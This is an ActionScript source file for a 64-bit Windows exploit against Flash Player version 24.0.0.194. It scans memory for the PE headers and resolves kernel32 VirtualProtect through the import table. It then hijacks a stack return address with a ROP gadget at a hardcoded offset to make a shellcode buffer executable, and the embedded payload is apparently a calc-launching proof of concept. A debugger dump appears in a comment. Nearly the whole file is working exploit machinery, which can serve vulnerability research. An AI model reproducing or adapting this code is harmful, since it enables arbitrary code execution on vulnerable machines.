package
{
	import flash.external.*;
	
	class ShellWin64 extends ExpWin64
	{
		// searches for the kernel32.VirtualProtect() address
		static function FindVP():Number
		{
			try
			{
				// find IMAGE_DOS_HEADER
				var b0:Number = Get(GetAddr(_ba), 0xffff0000);
				if (b0 < 0x1800000) throw new Error("can't find MZ down from " + Hex(b0));
				var b:Number = b0 - 0x800000;
				
				SetBase(Get(GetAddr(_ba),0));
				//Log("b = " + Hex(b) + ", _base = " + Hex(_base));
				for (var i:uint; i < 0x100; i++, b -= 0x10000)
				{
					// check 'MZ'
					if (uint(Get32(b) & 0xffff) == 0x5a4d) { /*Log("mz offset = " + i);*/ break; }
				}
				if (i >= 0x100) throw new Error("can't find MZ down from " + Hex(b0));

				// get IMAGE_NT_HEADERS
				var n:Number = b + Get32(b + 0x3c);
				// check 'PE'
				if (Get32(n) != 0x4550) throw new Error("can't find PE at " + Hex(n));
				
				// get IMAGE_IMPORT_DIRECTORY
				var size:uint = Get32(n + 0x94);
				n = b + Get32(n + 0x90);

				// find kernel32.dll
				var oft:Number, ft:Number;
				for (i = 0; i < size; i += 5 * 4)
				{
					Get32(b + Get32(n + i + 3*4) -4); // shift _ba.position
					if (_ba.readUTFBytes(12).toUpperCase() == "KERNEL32.DLL") 
					{
						oft = Get32(n + i);
						ft = Get32(n + i + 4*4);
						break;
					}
				}

				if (oft == 0 || ft == 0) throw new Error("can't find kernel32");

				// find VirtualProtect() address
				oft += b;
				for (i = 0; i < 0x180; i++, oft += 8)
				{
					// get proc name
					b0 = Get(oft);
					if (b0 == 0) throw new Error("can't find VirtualProtect");
					Get32(b + b0 -4); // set _ba.position
					if (_ba.readUTF().toUpperCase() == "VIRTUALPROTECT")
						return Get(b + ft + i*8);
				}
			}
			catch (e:Error)
			{
				Log("FindVP() " + e.toString());
			}

			return 0;
		}

		// overwrite return address and calls VirtualProtect()
		static function CallVP(vp:Number):Number
		{
			// generate Payload() function object
			Payload();
			var args:Array = new Array(6);
			Payload.apply(null, args);
			
			// find stack address in Payload() object
			var p:Number = GetAddr(Payload);
			Log(Hex(Get(Get(Get(p + 0x10) + 0x28) + 8)));
			/*
			 *  0000049f`bc3f1000 00007ff9a0afa4f0 0000024e07a5cac0 0000049fbc3f0040 0000049fbc3ee088
				0000049f`bc3f1020 0000049fbc3f1000 0000000000000c28 0000000000000000 0000000000000000
				0000049f`bc3f1040 00000063e1240000 00000063e1240000 0000000000000000 00000063e12fb270
				0000049f`bc3f1060 0000000000000000 0000000000000000 0000049fbc3ee2c8 0000000300001b9c
				0000049f`bc3f1080 0000400000000397 00001a5100000800 0000000200000001 0000000000000000
				0000049f`bc3f10a0 000002b7bce0b088 0000000000000000 0000049fbc3f1000 0000024e07a5cac0
				0000049f`bc3f10c0 0000000000000001 00001c0100000000 0000000000010001 0000000000000000
				0000049f`bc3f10e0 0000000000000101 0000000100000000 0000000000000000 0000000000000000
				0000049f`bc3f1100 0000000000000001 000002b7bce0b0d8 0000000000000000 00000063e12fae90
				
				0:012> r
				rax=00007ff9a011c340 rbx=000002b7bd030d00 rcx=000002b7bce0b0d8
				rdx=000002b7bcebb298 rsi=000002b7be67c0d0 rdi=000002b7be67c150
				rip=00007ff9a01267dd rsp=00000063e12facb8 rbp=000002b7be67c150
				 r8=000002b7bd0fef70  r9=0000024e07a5cac0 r10=0000000000001000
				r11=0000000000000001 r12=0000000000000018 r13=000002b7be7b7ee8
				r14=000002b7bd027580 r15=000002b7bd03c860
				iopl=0         nv up ei pl nz na pe nc
				cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
				Flash64_24_0_0_194!IAEModule_IAEKernel_UnloadModule+0x33e48d:
				00007ff9`a01267dd c3              ret
			 * */
			var stackAddrPointer:Number = Get(Get(Get(p + 0x10) + 0x28) + 8) + 0x118;
			var stackAddr:Number = Get(stackAddrPointer);
			Log("stackAddr: " + Hex(stackAddr));

			stackAddr += 0x600;
			
			var ptbl:Number = Get(Get(Get(p + 0x10) + 0x28) + 8) + 0x108;
			// save original pointers
			var p1:Number = Get(ptbl);
			var p2:Number = Get(p+0x38);
			var p3:Number = Get(p+0x40);
			var p4:Number = Get(p1-8);
			//Log(Hex(p) + ": " + Dump(p,16) + "<br>" + Hex(p1) + ", " + Hex(p2) + ", " + Hex(p3));

			// allocate storage for payload and get his address
			var len:uint = PayloadWin64.calc.length;
			//Log("payload length = " + len + " bytes");
			var v:Vector.<uint> = new Vector.<uint>(Math.max(0x300, len));
			var vAddr:Number = GetAddr(v);
			//Log("payload object = " + Hex(vAddr));
	//		vAddr += _isDbg ? 0x38 : 0x30;
			vAddr += 0x30;
			if (Get(vAddr) < 0x10000) vAddr -= 8;
			vAddr = Get(vAddr) + 0x10;
			Log("payload address = " + Hex(vAddr));
			arr2[2] = v;
			
			//create ROP
			var b0:Number = Get(GetAddr(_ba));
			//Log("ba vtable " + Hex(b0));
			//if (b0 < 0x1800000) throw new Error("can't find MZ down from " + Hex(b0));
			var flashBase:Number = b0 - 0x1496430; //this offset is for flash64_24_0_0_194
			//0x0000000181216289: pop r9; pop r8; pop rdx; pop rcx; pop rax; ret; for flash64_24_0_0_194
			var ropAddr:Number = flashBase + 0x1216289;
			
			var ropAddrPointer:Number = stackAddr;
			
			args[0] = ropAddrPointer;
			args[1] = ropAddr;
			args[2] = vAddr;
			args[3] = v.length * 4;
			args[4] = vp;
			args[5] = Get(Get(Get(p + 0x10) + 0x28) + 8) + 0x58;
			
			Payload.apply(null, args);

			// copy payload into v[]
			for(var i=0; i < len; i++) v[i+3] = PayloadWin64.calc[i];

			// return pointer to payload
			return vAddr;
		}

		static function Exec()
		{
			try
			{
				// get kernel32.VirtualProtect() address
				var vpAddr:Number = FindVP();
				Log("VirtualProtect() address = " + Hex(vpAddr));
				if (vpAddr == 0) throw new Error("vpAddr == 0");

				// call VirtualProtect()
				var xAddr:Number = CallVP(vpAddr);		
			}
			catch (e:Error)
			{
				Log("Exec() " + e.toString());
			}
		}
	}
}